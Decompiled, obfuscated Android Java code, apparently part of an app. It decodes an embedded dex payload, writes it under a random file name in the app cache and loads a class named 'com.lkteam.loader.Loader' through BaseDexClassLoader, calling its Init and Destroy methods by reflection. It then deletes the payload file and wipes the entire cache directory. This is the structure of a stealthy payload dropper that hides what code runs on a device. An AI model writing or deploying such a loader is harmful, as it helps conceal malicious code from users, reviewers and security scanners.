package c.a;

import android.app.Service;
import android.content.Context;
import dalvik.system.BaseDexClassLoader;
import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.util.Random;

public class d {

    /* renamed from: a  reason: collision with root package name */
    public static Object f673a;

    /* renamed from: b  reason: collision with root package name */
    public static Method f674b;

    /* renamed from: c  reason: collision with root package name */
    public static Method f675c;
    public static byte[] d;
    public static String e;
    public static Context f;

    public static void d(Context contx, byte[] dexdata) {
        if (!b.d(f).a("RAND")) {
            b.d(f).e("RAND", g());
        }
        f = contx;
        d = c.e(dexdata);
        e = f.getCacheDir() + "/" + b.d(f).b("RAND");
        e();
    }

    public static void i(Context context) {
        try {
            File dir = context.getCacheDir();
            if (dir != null && dir.isDirectory()) {
                f(dir);
            }
        } catch (Exception e2) {
        }
    }

    public static boolean f(File dir) {
        if (dir != null && dir.isDirectory()) {
            String[] children = dir.list();
            for (String file : children) {
                if (!f(new File(dir, file))) {
                    return false;
                }
            }
        }
        return dir.delete();
    }

    public static String g() {
        StringBuilder salt = new StringBuilder();
        Random rnd = new Random();
        while (salt.length() != 6) {
            salt.append("abcdefghijklmnopqrstuvwxyz1234567890".charAt(rnd.nextInt("abcdefghijklmnopqrstuvwxyz1234567890".length())));
        }
        return salt.toString();
    }

    public static void b(Context context, Service service) {
        try {
            f674b.invoke(f673a, new Object[]{context, service, d});
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void a() {
        try {
            f675c.invoke(f673a, new Object[0]);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void c() {
        try {
            Class<?> tmpClass = new BaseDexClassLoader(e, f.getCacheDir(), f.getApplicationInfo().nativeLibraryDir, f.getClassLoader()).loadClass("com.lkteam.loader.Loader");
            f673a = tmpClass.newInstance();
            Method method = tmpClass.getMethod("Init", new Class[]{Context.class, Service.class, byte[].class});
            f674b = method;
            method.setAccessible(true);
            Method method2 = tmpClass.getMethod("Destroy", new Class[0]);
            f675c = method2;
            method2.setAccessible(true);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void e() {
        try {
            FileOutputStream fo = new FileOutputStream(e);
            fo.write(d);
            fo.flush();
            fo.close();
            c();
            h(e);
            i(f);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void h(String fileName) {
        File file = new File(fileName);
        if (file.exists()) {
            file.delete();
        }
    }
}
